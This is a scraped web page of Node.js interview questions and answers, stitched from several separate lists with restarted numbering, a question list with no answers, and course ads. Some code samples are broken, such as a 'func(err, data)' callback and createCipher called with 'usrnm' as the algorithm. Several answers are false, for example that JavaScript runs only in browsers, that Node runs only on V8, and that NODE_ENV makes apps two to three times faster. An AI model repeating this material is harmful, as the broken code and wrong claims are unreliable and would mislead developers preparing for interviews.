59. How should environment configuration be handled securely?
Configuration often includes sensitive data such as API keys and database credentials. These should never be hardcoded.

Developers handle configuration securely by:

Using environment variables
Keeping secrets out of version control
Using secret management tools in production
Maintaining separate configs for different environments
60. What is WASI, and why is it being introduced?
The WASI class implements the WASI API and provides additional convenience methods for interacting with WASI-based applications. Every WASI instance represents a unique sandbox environment.

Each WASI instance must specify its command-line parameters, environment variables, and sandbox directory structure for security reasons.

Unleash Your Career as a Full Stack Developer!AI-Powered Full Stack Developer ProgramEXPLORE COURSEUnleash Your Career as a Full Stack Developer!
61. What is a first-class function in Javascript?
First-class functions are a powerful feature of JavaScript that allows you to write more flexible and reusable code. In Node.js, first-class functions are used extensively in asynchronous programming to write non-blocking code.

62. How do you manage packages in your Node.js project?
Managing packages in your Node.js project is done with the Node Package Manager (NPM), which lets you install and manage third-party packages and create and publish your own.

63. How is Node.js better than other frameworks?
Node.js is a server-side JavaScript runtime environment built on top of the V8 JavaScript engine, the same engine that powers Google Chrome. It makes Node.js very fast and efficient, as well as highly scalable.

64. What is a fork in Node.js?
The Fork method in Node.js creates a new child process that runs a separate Node.js instance and can be useful for running CPU-intensive tasks or for creating a Node.js server cluster.

65. List down the two arguments that async. First, does the queue take as input?
The async.queue function in Node.js takes two arguments: a worker function and an optional concurrency limit. It is used to create a task queue executed in parallel.

66. What is the purpose of the module.exports?
The module. The exports object in Node.js is used to export functions, objects, or values from a module and is returned by the require() function when another module requires it.

67. What is the difference between JavaScript and Node.js?
Node.js is a runtime environment for executing JavaScript code outside of a web browser, while JavaScript is a programming language that can be executed in both web browsers and Node.js environments.

68. What are the asynchronous tasks that should occur in an event loop?
Asynchronous tasks that should occur in an event loop in Node.js include I/O operations, timers, and callback functions. By performing these tasks asynchronously, Node.js can handle a large number of concurrent requests without blocking the event loop.

69. What is the order of execution in control flow statements?
In Node.js, control flow statements are executed in a specific order. The event loop determines the execution order. The event loop is a mechanism in Node.js that allows non-blocking I/O operations to be executed.

70. What are the input arguments for an asynchronous queue?
An asynchronous queue in Node.js is a data structure that allows functions to be executed in a specific order. Functions are added to the queue and are executed in the order that they were added. An asynchronous queue is useful when executing a series of functions in a specific order.

71. Are there any disadvantages to using Node.js?
Node.js is less suitable for CPU-intensive tasks due to its single-threaded JavaScript execution model, though worker threads can help. Poorly managed asynchronous code can also lead to complexity. However, memory usage depends on the application's design rather than on Node.js itself.

72. What is the primary reason for using the event-based model in Node.js?
The main reason to use the event-based model in Node.js is performance. The event-based model allows non-blocking I/O, enabling Node.js to handle a large number of connections without consuming much resources.

73. What is the difference between Node.js and Ajax?
Ajax and Node.js are two different technologies that are used for different purposes. Ajax is a client-side technology allowing asynchronous communication between the client and the server. It is typically used to update parts of a web page without requiring a full page reload. 

Node.js, on the other hand, Node.js is a server-side technology used for building fast, scalable, and efficient server-side applications. It is typically used for real-time applications like chat, online games, and streaming services.

74. Why is Node.js quickly gaining attention from JAVA programmers?
Node.js is quickly gaining attention from Java programmers because it is fast, scalable, and efficient. Java is a popular server-side technology, but it can be slow and resource-intensive. Node.js, on the other hand, is built on the V8 JavaScript engine, which is known for its speed and performance.

75. What is "non-blocking" in Node.js?
In Node.js, non-blocking refers to the ability of the runtime environment to execute multiple tasks simultaneously without waiting for one task to complete before starting the next. This is achieved through asynchronous I/O, which enables Node.js to handle multiple requests concurrently.

76. How does Node.js overcome the problem of blocking I/O operations?
Node.js uses an event-driven, non-blocking I/O model that allows it to handle I/O operations more efficiently. By using callbacks, Node.js can continue processing other tasks while waiting for I/O operations to complete. This means that Node.js can handle multiple requests simultaneously without causing any delays

Additionally, Node.js uses a single-threaded event loop architecture, which allows it to handle a high volume of requests without any issues.

77. How can we use async await in Node.js?
To use async/await in Node.js, you'll need to use functions that return promises. You can then use the async keyword to mark a function as asynchronous and the await keyword to wait for a promise to resolve before continuing with the rest of the code.

78. Why should you separate the Express app and server?
Firstly, separating your app and server can make it easier to test your code. By separating the two, you can test your app logic independently of the server, making it easier to identify and fix bugs.

Secondly, separating your app and server can make it easier to scale your application. By separating the two, you can run multiple instances of your app on different servers, which can help to distribute the load and improve performance.

Finally, separating your app and server can make switching to a different server easier if necessary. By keeping your app logic separate from your server logic, you can switch to a different server without making any major changes to your code.

79. Explain the concept of stub in Node.js.
In Node.js, a stub is a function that serves as a placeholder for a more complex function. Stubs are typically used in unit testing to replace a real function with a simplified version that returns a predetermined value. Using a stub ensures your unit tests are predictable and consistent.

80. What are the security implementations that are present in Node.js?
One of the most important security features in Node.js is the ability to run code in a restricted environment. This is achieved through a sandboxed environment, which helps prevent malicious code from accessing sensitive data or causing damage to the system.

Another important security feature in Node.js is the use of TLS/SSL to encrypt data in transit. This can help to prevent eavesdropping and ensure that sensitive data is protected.

81. What is Libuv?
Libuv is a critical component of Node.js, enabling I/O operations to be handled in a non-blocking, efficient manner.

82. What are global objects in Node.js?
Global objects in Node.js are objects that are available in all modules without the need for an explicit require statement. Some of the most commonly used global objects in Node.js include process, console, and buffer.

83. What is the use of the connect module in Node.js?
The Connect module can handle various middleware types, such as error-handling, cookie-parsing, and session middleware. Error-handling middleware handles errors that occur during the request/response cycle.

Cookie parsing middleware parses cookies from the request header. Session middleware manages user sessions.

84. What are LTS releases of Node.js?
LTS stands for Long-term support. LTS releases of Node.js are supported for an extended period, usually 30 months from the time of release. These releases are typically more stable and reliable than non-LTS releases and are recommended for production use.

85. What do you understand about ESLint?
ESLint is a popular open-source tool that is used to analyze and flag errors and potential problems in JavaScript code.

86. Define the concept of the test pyramid. Please explain the process for implementing them using HTTP APIs.
The test pyramid is a concept often used in software testing to illustrate the ideal distribution of test types.

The pyramid has three layers: unit tests, integration tests, and end-to-end tests. The idea is that most tests should be at the unit level, with fewer tests at the integration and end-to-end levels.

To implement the test pyramid in terms of HTTP APIs, you can start by writing unit tests for each endpoint in the API. These tests should focus on the endpoint's functionality in isolation, without making any external requests or dependencies

Once the unit tests pass, you can write integration tests that verify the interaction between endpoints and components in the API. Finally, you can write end-to-end tests that test the entire API, from the user interface to the database.

87. What is an Event Emitter in Node.js?
An Event Emitter is a Node.js module that facilitates communication between objects in a Node.js application. It is an instance of the EventEmitter class, which provides methods for listening to and emitting events.

In Node.js, events are a core part of the platform, and they are used to handle asynchronous operations.

88. How to Enhance Node.js Performance through Clustering?
Clustering improves Node.js performance by creating multiple worker processes that share the same server port. Each worker runs on a separate CPU core, allowing better utilization of multi-core systems. Clustering is most effective for stateless applications handling high traffic.

89. What is a thread pool, and which library handles it in Node.js?
A thread pool is a collection of threads that are used to execute tasks in parallel. In Node.js, the thread pool is handled by the libuv library, a multi-platform support library that provides asynchronous I/O.

90. How are worker threads different from clusters?
Worker threads and clusters are two different approaches to leveraging multiple CPUs in Node.js. While clusters create multiple instances of a Node.js process, each running on a separate CPU core, worker threads allow multiple threads within a single process.

Become a Full Stack Developer in Just 9 Months!AI-Powered Full Stack Developer ProgramEXPLORE COURSEBecome a Full Stack Developer in Just 9 Months!
91. How to measure the duration of async operations?
The console.time and console.timeEnd methods allow you to measure the duration of a block of code. The console.time method starts the timer and the console.timeEnd method stops the timer and logs the duration to the console.

The performance.now method provides a more precise way to measure the duration of async operations. It returns the current timestamp in milliseconds, which can be used to calculate the duration of a task.

92. Where is package.json used in Node.js?
The package.json file is located in the root directory of an application and the npm package manager uses it to install and manage the dependencies of an application.

93. What is the difference between readFile and create Read Stream in Node.js?
Create Read Stream is a better option for reading large files, while the read file is a better option for small files. It is important to choose the right method based on the file size and the application's requirements.

94. What is the use of the crypto module in Node.js?
The crypto module is widely used in Node.js applications to generate secure random numbers, create digital signatures, and verify signatures. It also supports various encryption algorithms such as AES, DES, and RSA.

95. What is a passport in Node.js?
Passport is a popular authentication middleware for Node.js. It provides a simple and modular way to implement authentication in Node.js applications.

Passport supports many authentication mechanisms, including username/password, social logins like Facebook and Google, and JSON Web Tokens (JWTs).

96. How to get information about a file in Node.js?
In Node.js, the fs module provides methods for working with the file system. To get information about a file, you can use the fs. stat() method. The fs. stat() method returns an object that contains information about the file, such as the file size, creation date, and modified date.

97. How does the DNS lookup function work in Node.js?
In Node.js, the DNS module provides methods for performing DNS lookups. DNS stands for Domain Name System, and it translates domain names into IP addresses. The DNS.lookup () method performs a DNS lookup and resolves a domain name to an IP address.

98. Explain the concept of Punycode in Node.js.
Punycode is a character encoding scheme used in the Domain Name System (DNS) to represent Unicode characters with ASCII characters. It encodes domain names that contain non-ASCII characters, such as Chinese or Arabic characters.

99. What are the Challenges with Node.js?
Challenges with Node.js include handling CPU-intensive workloads, managing complex asynchronous flows, and ensuring proper error handling. Choosing the right architecture and using tools like worker threads and proper monitoring can address most of these challenges.

100. Why do you think you are the right fit for this Node.js role?
I’ve built and scaled backend services with Node.js, with a solid grasp of async code, APIs, and performance tuning. I’m used to working with teams, adjusting to changing project needs, and shipping features that actually run in production.

A highly engaged Reddit discussion titled “Node JS - What is the roadmap in 2026?” shares practical experiences from developers actively working with Node.js.
Many redditors say that while Node.js remains relevant, interviews now focus more on real-world problem-solving, async behavior, and backend design rather than just theory.
Key Takeaways
Interview questions in Node.js mainly check your clarity of concepts and how well you explain your approach, not just whether the answer is correct
A solid understanding of the event loop, asynchronous programming, streams, modules, and error handling helps you tackle most Node.js interview questions with confidence
Practicing Node.js interview questions and answers at beginner, intermediate, and experienced levels prepares you for different interview formats and difficulty levels
Short, structured Node.js courses and hands-on practice can help you build confidence and prepare in a more organized way
If you want to go beyond quick prep and build job-ready skills in modern web application development, enroll in Simplilearn’s AI-powered Full Stack Developer Program. It strengthens your full-stack foundations and hands-on practice, helping you feel more confident in Node.js interviews.

Top 50 Node.js Interview Questions and Answers [2026]
Node.js is a JavaScript environment used to execute JavaScript code outside the browser. Based on Chrome’s V8 engine, it represents the JavaScript anywhere and everywhere programming paradigm, unifying web app development to a single language rather than different languages for server and client-side scripting.

LinkedIn, IBM, GoDaddy, Groupon, Netflix, and Paypal all use Node.js. Its increasing popularity has sparked a demand for Node.js developers, which means tons of job opportunities! 

But if you’re nervous about your interview, don’t worry. We’ll help you prepare with these Node.js interview questions. Let’s start with some basic Node js questions for entry-level roles. 

Node.js Interview Questions and Answers
Node.js Interview Questions for Freshers
These beginner Node interview questions cover the basic concepts, but it’s important you know them thoroughly.

1. What is Node.js?
Node.js is a JavaScript runtime environment built with Chrome’s V8 JavaScript engine as a platform. It’s popular because it’s lightweight and efficient, due to its event-driven and non-blocking I/O model. Built with performance as its primary focus, Node.js processes the JavaScript code into the native machine code, which your computer can use to execute processes. 

Even though Node.js is based on Chrome’s V8 engine, it doesn’t run in the browser itself. During development, various features like file system API, HTTP library and OS utility methods were added to the engine, so Node.js could be executed as a program on a computer.

2. How are “Child Threads” handled in Node.js?
Primarily, Node.js is a single-thread process. It doesn’t expose any child threads and the modes of thread management to the developer. However, child threads may be generated in Node.js in various processes like asynchronous I/O. Although the child threads spawned through these processes run in the backdrop, they don’t block the main code or execute any application code. But if you require threading support in an application powered by Node.js, multiple tools are available for utilization.

3. What are some differences between Angular JS and Node.js?
Below are some differences between Angular JS and Node.js

AngularJS

Node.js

Written in TypeScript

Written in a variety of languages, like C, C++, and JavaScript

Great for creating highly interactive web pages

Suited for small-scale projects and applications

Open-source framework for web application development

Runtime environment based on multiple platforms

Used to create single-page applications for client-side

Used to create server-side networking applications

Helps split an application into model-view-controller (MVC) components

Helps generate queries for databases

Appropriate for developing real-time applications

Appropriate for situations requiring quick action and scaling 

Angular itself is a web application framework

Node.js has many frameworks, including Express.js, Partial.js and more

4. State the primary uses of Node.js.
Here are some of Node.js functions: 

Complex single-page applications: Node.js is ideal for creating complex, single-page applications, like online drawing tools, mail solutions, and social networking. These types of applications are limited to one page, with UX similar to that of a desktop application. Node.js can be used here due to its asynchronous data flow in the backend.
Real-time applications (RTA): We use several real-time applications in day-to-day life like Google Docs, Slack, Skype, WhatsApp and many more. Node.js’ event API, WebSockets, and asynchronous data flow ensure a faultless server operation, which updates the data instantly.
Chat rooms: This may be clubbed under RTA, but since instant messaging and chatting has emerged as one of the top real-time application models, it needs a special focus. If you have a chat room product, you’re looking at requirements like lightweight, high traffic capacity and substantial data flow. Node.js and someJavaScript frameworkat the backend fulfills all these requirements. The aforementioned web sockets come in handy for receiving and sending messages in a chat room environment.
Browser-based games: The above-mentioned chat rooms can also be integrated into browser-based games, where Node.js is a perfect choice. Combining the Node.js technology with HTML5 and even JS tools will help you create real-time browser-based games.
Data streaming applications: The key selling point of these applications is that their data processing in the unloading phase. Through this, some parts can be downloaded upfront to keep the connection and download other parts later. In this context, Node.js streaming applications deal with both audio and video data.
Representational State Transfer (REST) Application Programming Interfaces (APIs): APIs based on REST hold a key position in the construction of modern commercial software architecture due to the wide usage of the HyperText Transfer Protocol (HTTP). The Express.js framework of the Node.js ecosystem can help build fast and light REST APIs.
Server-side web applications: While Node.js and its frameworks can help in creating server-side web applications, you can’t expect CPU-heavy operations.
Command Line Tools: Node.js’ expansive ecosystem helps build CLT — check out online tutorials to build your own. 
NodeJs Functions

5. What is event-driven programming?
The event-driven programming approach uses events to trigger various functions. In this scenario, an event can be anything, such as pressing a key or clicking a mouse button. Whenever an event occurs, a call-back function already registered with the element is executed, following the “publish-subscribe” pattern. Due to this programming approach, Node.js is faster than other comparable technologies.

6. In the context of Node.js, what is REPL?
REPL is Read, Eval, Print and Loop. REPL is a computer environment (similar to a Windows console or Linux shell) where any entered command is met with a system-response output. The REPL environment is bundled with Node.js by default, and it performs the following tasks:

Reads user inputs, converts them into JavaScript data-structures, and stores them.
Evaluates data structures.
Prints the final output
Loops the provided command until CTRL + C is pressed two times.
7. What is a test pyramid in Node.js?
A test pyramid is a figure that explains the proportions of unit tests, integration tests, and end-to-end tests required to successfully develop a project:

Unit tests: They test the individual units of code quickly, in isolation. 
Integrations tests: They test the integration among dissimilar units.
End-to-end (E2E) tests: They test the system as a whole, right from the user interface to the data store, and back.
8. What is libuv?
Libuv is a support library of Node.js used for asynchronous input/output. While it was initially developed just for Node.js, it now witnesses practice with other systems such as Luvit, Julia, Pyuv, and more. Some of its features include: 

File System Events
Child Processes
Full-featured event loop backed
Asynchronous TCP & UDP sockets
9. Is Node.js the best platform for CPU-heavy applications?
CPU-incentive applications are not a strong suit of Node.js. The CPU-heavy operations block incoming requests and push the thread into critical situations.

10. What is the purpose of the Express JS Package?
Built on top of Node.js, ExpressJS is a JS framework that manages the flow of information between the routes and server in server-side apps. Being lightweight, flexible, and filled with relevant features, it’s great for mobile and web application development.

11. What are the main differences between Node.js vs. Javascript?
Node.js

JavaScript

Cross-platform open source JS runtime engine. 

A high-level scripting language based on the concept of OOPS.

Code can be run outside the browser. 

Code can run only in the browser.

Used on server-side.

Used on client-side.

No capabilities to add HTML tags.

Can add HTML tags.

Can be run only on Google Chrome's V8 engine.

Can be run on any browser.

Written in C++ and JavaScript.

An upgraded version of ECMA script written in C++.

12. What are the major benefits of Node.js?
The benefits of Node.js are:

Easy to learn and huge community support.
Easy scalability and high performance.
Highly extensible with extended support.
Supports full-stack JavaScript.
Caching mechanism allows web pages to load faster.
Non-blocking I/O systems.
13. What is the difference between asynchronous and non-blocking?
Asynchronous or non-synchronous means that we will not receive a response to a message immediately — there is no dependency or order of execution. The server stores information and acknowledges when the action is performed. This improves performance and efficiency.

Non-blocking operation does not stop or block any operations. The difference is that a non-blocking operation receives a response immediately with whatever data is available. If data is not available, it returns an error. It is mostly used with I/O.

14. What is package.json?
The npm packages contain a file package.json in the project root folder, which contains the metadata relevant to the project. It gives information to the npm through which npm identifies a project and its dependencies. Apart from this, it contains other metadata like project description, version, license information, and configuration data. 

15. Describe the error-first callback in Node.js.
The error-first callback, also called as errorback gives the error and data. It takes a few arguments, the first one being the error object and others being the data. The error-first callback pattern has many advantages: since it is consistent, leads to more adoption, if there is no reference to the data, there is no need to process it. If there is no error, the callback is called with null as the first argument. 

Advanced Node.js Interview Questions for Experienced Professionals
Now we move onto advanced node interview questions. Remember to be able to put these concepts into practice.

16. Explain the purpose of module.exports.
These tell Node.js when parts of the code that like objects, functions, strings etc. should be exported from a given file so other files can access it. Suppose we have this module: 

{

id: '.',

exports: {},

parent: null,

filename: '/modtest.js',

loaded: false,

children: [],

paths:

[

'/node_modules',

'/Users/node_modules',

'/Users/mycomp/projects/node_modules',

'/node_modules'

]

}
Note the export property is empty. If we apply code to this property, that will become the export of the module. If we require the module in another file, that will be the export property value:

module.exports.stringProperty = "Hello, welcome";

console.log(module);

{

id: '.',

exports: { stringProperty: 'Hello, welcome' }

...

}
17. What is the reactor pattern in Node.js?
reactor pattern in Node.js

The reactor pattern is a concept of non-blocking I/O operations in Node.js. Through this pattern, we get the handler (or callback function) for each I/O operation. Each I/O request is submitted to a demultiplexer that handles concurrency and queues the requests/events. It consists of resources, event notifier/demultiplexer, event loop, event queue, request handler, and more. 

18. Explain LTS releases of Node.js.
LTS or Long-Term Support is applied to release lines supported and maintained by the Node.js project for an extended period. There are two types of LTS: 

Active, which is actively maintained and upgraded, and 
Maintenance line nearing the end of the line and maintained for a short period.
19. What is a URL module?
The URL module provides APIs to work with URLs:

a legacy API specific to Node.js.
newer API that implements WHATWG URL (standard used by web browsers).
Some example methods are URL.port, URL.password, URL.host, url.toString() under the URL class. For the full documentation, check the officialURL module page.

20. Explain control flow function.
Control flow function is the sequence in which statements or functions are executed. Since I/O operations are non-blocking in Node.js, control flow cannot be linear. Therefore, it registers a callback to the event loop and passes the control back to the node, so that the next lines of code can run without interruption. For example:

[code language="javascript"]

fs.readFile('/root/text.txt', func(err, data){

console.log(data);

});

console.log("This is displayed first");

[/code]
In this, the readFile operation will take some time; however, the next console.log is not blocked. Once the operation completes, you’ll see the displayed data. 

21. What are the main differences between the spawn() and fork() methods in Node.js?
Spawn

Fork

Designed to run system commands.

A special instance of spawn() that runs a new instance of V8.

Does not execute any other code within the node process. 

Can create multiple workers that run on the same Node codebase.

child_process.spawn(command[, args][, options]) creates a new process with the given command. 

Special case of spawn() to create child processes using. child_process.fork(modulePath[, args][, options])

Creates a streaming interface (data buffering in binary format) between parent and child process.

Creates a communication (messaging) channel between parent and child process.

More useful for continuous operations like data streaming (read/write). For example, streaming images/files from the spawn process to the parent process.

More useful for messaging. For example, JSON or XML data messaging.

22. What is the purpose of the ExpressJS package in Node.js?
ExpressJS package or framework is built on top of Node.js to fast-track the development of single-page, multi-page and hybrid server-based applications. Express is said to be the backend part of the MEAN stack.

23. Highlight the differences between process.nextTick() and setImmediate().
let execseq = function() { 

setImmediate(() => console.log("immediate")); 

process.nextTick(() => console.log("nextTick")); 

console.log("event loop");

}
This will execute the "event loop," "nextTick," and "immediate.”

24. What is the difference between Node.js vs. Ajax?
Ajax is a client-side technology that updates page content without refreshing the page. Node.js is a server-side JavaScript used to develop server software. Further, Node.js is a full-fledged development environment, whereas Ajax just obtains data or runs scripts.

25. Why must the express “app” and “server” be separated?
If we keep the app and server functionalities separate, the code can be divided into multiple modules, which reduces the dependency between modules. Each module will perform a single task. Finally, the separation of logic helps avoid duplicate code.

26. Explain the difference between setImmediate() vs setTimeout().
While the word immediate is slightly misleading, the callback happens only after the I/O events callbacks. When we call setImmediate()., setTimeout() is used to set a delay (in milliseconds) for the execution of a one-time callback. If we execute: 

setImmediate(function() {

console.log('setImmediate')

})

setTimeout(function() {

console.log('setTimeout')

}, 0)
We will get the output as “setTimeOut” and then “setImmediate.”

27. List and explain the popular modules of Node.js.
Here are Node.js’ core modules: 

http

Includes classes, methods, and events for creating Node.js http server.

URL

Contains methods for URL resolution and parsing.

querystring

Deals with query string.

path

Contains methods for working with file paths.

fs

Consists of classes, methods, and events for handling file I/O.

util

Includes utility functions useful for developers.

28. What is an example of reading and writing streams?
Here’s an example of reading stream:

var readStream = fs.createReadStream('data.txt');

readStream.on('data', function(chunk) {

data += chunk;

});

Here’s an example of reading into stream:

var writeStream = fs.createWriteStream('dataout.txt');

writeStream.write(data,'UTF8');

writeStream.end();
29. What is the crypto module in Node.js? How is it used?
The crypto module in Node.js is used for cryptography, i.e., it includes a set of wrappers for the open SSL's hash, HMAC, sign, decipher, cipher, and verify functions.

Here’s an example of using a cipher for encryption:

const crypto = require('crypto'); 

const cipher = crypto.createCipher('usrnm', 'pwdd'); 

var encryptd = cipher.update('Welcome to hackr', 'utf8', 'hex'); 

encryptd += cipher.final('hex'); 

console.log(encryptd);
Let’s use decipher to decrypt the above to see if we get the same text back:

const crypto = require('crypto'); 

const decipher = crypto.createDecipher('usrnm', 'pwdd'); 

var encryptd = '<enter the previous output-encrypted code here>'; 

var decryptd = decipher.update(encryptd, 'hex', 'utf8'); 

decryptd += decipher.final('utf8'); 

console.log(decryptd);
30. Explain the DNS module.
The DNS module is used for resolving a name and an actual DNS lookup. With this module, it is not required to memorize the IP addresses as the DNS servers convert domain/subdomain into IP addresses.

31. Explain the security mechanism of Node.js.
The security mechanisms are:

Authorization codes: Authorization codes help secure Node.js from unauthorized third parties. Anyone who wants to access Node.js goes through the GET request of the resource provider's network. 
Certified Modules: Certification modules are like filters that scan the libraries of Node.js to identify if any third-party code is present or not. Any hacking can be detected using certifications. 
Curated Screening register: This is a quality control system where all the packages (code and software) are checked to ensure their safety. This scan helps to eliminate unverified or unreliable libraries getting into your application.
Regular updates: Downloading the newest version of Node.js will prevent potential hackers and attacks. 
32. Explain the various types of API functions in Node.js.
The two types of API functions in Node.js are:

Asynchronous/Non-blocking: These requests do not wait for the server to respond. They continue to process the next request, and once the response is received, they receive the same.
Synchronous/Blocking: These are requests that block any other requests. Once the request is completed, only then is the next one taken up.
33. What are LTS versions of Node.js?
Long-term Support or LTS version are Node.js releases calling the critical fixes, performance step-ups, and security updates. These versions receive support for at least 1.5 years and focus on the application’s security and stability.

34. Explain how assert works. 
Assert is used to write tests in Node.js. The feedback is provided only if any of the test cases that are running fail. To test invariants, the module gives you a set of assertion tests. It is used internally by Node.js, but if you use the require (‘assert’) code, you will be able to use it in other applications as well.

35. What is callback hell?
In Node.js, callback hell is also known as the Pyramid of Doom. These are caused by intensively nested, unreadable, and unmanageable callbacks, making the code harder to read and debug. It is caused due to improper execution of the asynchronous logic.

36. What is a stub in Node.js?
Stubs are programs or functions used to stimulate component behavior. Stubs provide the answers to the functions during test cases.

37. What is an Event Loop?
Node.js handles asynchronous callbacks. This is the foundation of the non-blocking input/output in Node.js, making it one of the most vital features. Remember, Node.js is event driven. Due to the nature of Node.js being event-driven, a listener can be attached to an event for the callback to be executed by the former when the event occurs. 

Node.js executes the event loop and then moves on to the rest of the code, without having to wait for the output. Once the whole operation culminates, it receives the output and the callback function is executed. Once it receives the response, the functions are executed one by one.

38. What are streams in Node.js? What are the types?
In Node.js, streams are the collection of data similar to strings and arrays. Moreover, streams are objects through which you can read source data or write destination data continuously. These streams are particularly helpful for reading and processing large amounts of information. There are four types of streams in Node.js, which are:

Readable: Used to read large amount of data from source
Writeable: Used to write data to destination
Duplex: Used for both read and write
Transform: A duplex stream used for data modification
39. List and explain the timing features of Node.js.
A timer module containing multiple functions for the execution of the code after a specific time period is provided by Node.js. Some of the functions provided in this module are:

process.nextTick: This function schedules a callback function which is required to be invoked in the next iteration of the event loop
setTimeout/clearTimeout: This function schedules code execution after the assigned amount of time (in milliseconds)
setImmediate/clearImmediate: This functions executes code at the conclusion of the existing event loop cycle
setInterval/clearInterval: This function is used to execute a block of code a number of times
40. Highlight the differences between process.nextTick() and setImmediate().
Both process.nextTick() and setImmediate() are functions of the Timers module, but the difference lies in their execution.

The process.nextTick() function waits for the execution of action till the next pass around in the event loop or when the event loop culminates, only then is the callback function invoked.
The setImmediate() function is used for callback method execution on the next cycle of the event loop, which returns it to the event loop for the execution of the input/output operations.
41. Explain readFile and createReadStream in Node.js.
Both readFile and createReadStream are ways to read and execute files provided by Node.js.

The readFile process is fully buffered which returns response(s) only if the complete file is entered into the buffer and can be read. This process is highly memory intensive and can become slow in case the file size is large.

The createReadStream process is partially buffered, treating the entire process as a series of events. In this process, the whole files are split into chunks that are processed and then sent as a response individually in succession. Unlike readFile, createReadStream is effective when it comes to reading and processing large files.

42. Does Node.js provide a debugger?
A built-in TCP protocol and the debugging client is provided by Node.js. If you wish to debug your file, you can use the following argument before the name of your JS file which you wish to debug.

node debug [script.js | -e “script” | :]
43. Describe the exit codes in Node.js.
Exit codes in Node.js are a specific group of codes that finish off processes, which can include global objects as well. Some of the exit codes in Node.js are:

Internal JavaScript Evaluation Failure
Fatal Error
Internal Exception handler Runtime failure
Unused
Uncaught fatal exception
44. Why is NODE_ENV used?
When any Node.js project is in the stage of production, Node.js promotes the principle to use the NODE_ENV variable to flag it. When the NODE-ENV is set to production, your application will perform at a speed 2 to 3 times faster than usual. The variable also improves judgment during the development phase of projects.

45. What is EventEmitter in Node.js?
Node.js has an EventEmitter class which holds all the objects which can emit events. These objects hold a function called eventEmitter.on() using which multiple functions can be attached to the event emitted by the object. Whenever an object from the EventEmitter class throws an event, all the attached functions to the event are called upon synchronously.

46. What is Punycode?
Punycode can be defined as an encoding syntax in Node.js which is helpful for converting the Unicode string of characters into ASCII. This is done as the hostnames can only comprehend ASCII codes and not Unicode. While it was bundled up within the default package in recent versions, you can use it in the previous version using the following code:

punycode = require(‘punycode’);
47. Explain the concept of JIT and highlight its relationship with Node.js.
A JIT or Just-in-time compiler sends bytecode (consisting of interpretable instructions) to the processor by converting it into instruction. Once you are finished with the writing part of a program, the source language statements are compiled into bytecode by the compiler, rather than the code that carries the data which is similar to the destination hardware platform processor.

Node.js employs JIT compilation which improves the speed of code execution to a great extent. It takes the source code and converts it into machine code at runtime. Through this, functions that are called regularly are compiled to machine code, increasing the overall speed of code execution.

48. Why is the buffer class used in Node.js?
In Node.js, the buffer class stores the raw data, in a manner similar to that of an array of integers. However, it communicates to a raw memory dump, allocated outside the V8 heap. The Buffer class is a global class and can be accessed in an application without having to import the buffer module. It is typically used as pure JavaScript code is not attuned with binary data.

49. How do the fork and spawn methods work?
 

In Node.js, spawn () launches a new process with the available set of commands. This doesn’t generate a new V8 instance; only a single copy of the node module is active on the processor. This method can be used when your child process returns a large amount of data to the node.

On the other hand, fork () is a particular case of spawn () which generates a new V8 engine instance. Through this method, multiple workers run on a single node code base for multiple tasks.

50. State the steps to write an Express JS application.
To set up an ExpressJs application, you need to go through the following steps:

Create a folder with the project name
Create a file named package.json inside the folder
Run the ‘npm install’ command on the command prompt to install the libraries present in the package file\
Create a file named server.js
Create the ‘router’ file inside the package consisting of a folder named as index.js
The application is created inside the package containing the index.html file
Bonus Tips
Here are a few extra tips that will make sure you nail that interview.

Focus on Node.js programming interview questions. We’ve made this part easy with our comprehensive list.You’ll find several of these resources online, including on Hackr. As in every tech interview, 
Practice: Coding on the spot is more nerve-wracking than at leisure, but interviewers need to see your skills in action. Practice a few coding questions to prepare for your interview. 
Brush up on related tools: It’s important you have experience with other related tech tools and frameworks. that includes MySQL, Mongo or Postgres, and React, Angular, or Backbone for frontend frameworks. 
Conclusion: Start Preparing for Your Node.js Interview
With this, we come to the end of our top Node.js interview questions. As you prepare for your Node js interview, consider checking out the best Node.js tutorials, curated by community members. These will all go a long way in helping you in your Node js interview. And if you’re ready to commit to longer-term learning? 

Sign Up For a Node.js Developer Course

Frequently Asked Questions
1. How Do I Prepare for a Node Interview?
You can prepare for a Node interview with our comprehensive list of Node js programming interview questions listed above. Set aside time to practice Node.js coding questions as well!

2. What is Callback in Node JS?
A callback is a function called when a task is completed. It allows other code to run in the meantime, and prevents blocking.

 1.What is Node.js? Where can you use it?

2. Why use Node.js?

3. How does Node.js work?

4. Why is Node.js Single-threaded?

5. If Node.js is single-threaded, then how does it handle concurrency?

6. Explain callback in Node.js.

7. What are the advantages of using promises instead of callbacks?
8. How would you define the term I/O? 
9. How is Node.js most frequently used?

10. Explain the difference between frontend and backend development?

11. What is NPM?

12. What are the modules in Node.js?

13. What is the purpose of the module .Exports?

14. Why is Node.js preferred over other backend technologies like Java and PHP?

15. What is the difference between Angular and Node.js?

16. Which database is more popularly used with Node.js?

17. What are some of the most commonly used libraries in Node.js?

18. What are the pros and cons of Node.js?

19. What is the command used to import external libraries?

20. What does event-driven programming mean?

21. What is an Event Loop in Node.js?

22. Differentiate between process.nextTick() and setImmediate()?

23. What is an EventEmitter in Node.js?
24. What are the two types of API functions in Node.js?

25. What is the package.json file?

26. How would you use a URL module in Node.js?

27. What is the Express.js package?

28. How do you create a simple Express.js application?
29. What are streams in Node.js?

30. How do you install, update, and delete a dependency?

31. How do you create a simple server in Node.js that returns Hello World?

32. Explain asynchronous and non-blocking APIs in Node.js.
33. How do we implement async in Node.js?

34. What is a callback function in Node.js?

35. What is REPL in Node.js?

36. What is the control flow function?

37. How does control flow manage the function calls?

38. What is the difference between fork() and spawn() methods in Node.js?

39. What is the buffer class in Node.js?

40. What is piping in Node.js?

41. What are some of the flags used in the read/write operations in files?

42. How do you open a file in Node.js?

43. What is callback hell?
44. What is a reactor pattern in Node.js?

45. What is a test pyramid in Node.js?

46. For Node.js, why does Google use the V8 engine?

47. Describe Node.js exit codes.

48. Explain the concept of middleware in Node.js.

49. What are the different types of HTTP requests?

50. How would you connect a MongoDB database to Node.js?

51. What is the purpose of NODE_ENV?

Node Js Interview Questions And Answers
Node.js:
Ans. Node.js is a server-side JavaScript runtime environment built on the V8 JavaScript engine. It allows developers to run JavaScript on the server side, enabling the development of scalable and high-performance network applications. Node.js is particularly well-suited for building real-time, data-intensive, and event-driven applications.
Why use Node.js:
Ans.

Single Programming Language: Node.js allows developers to use JavaScript for both server-side and client-side scripting, providing a consistent language across the entire application stack.
Non-blocking I/O: Node.js is designed to be non-blocking, making it efficient for handling concurrent operations and providing high performance.
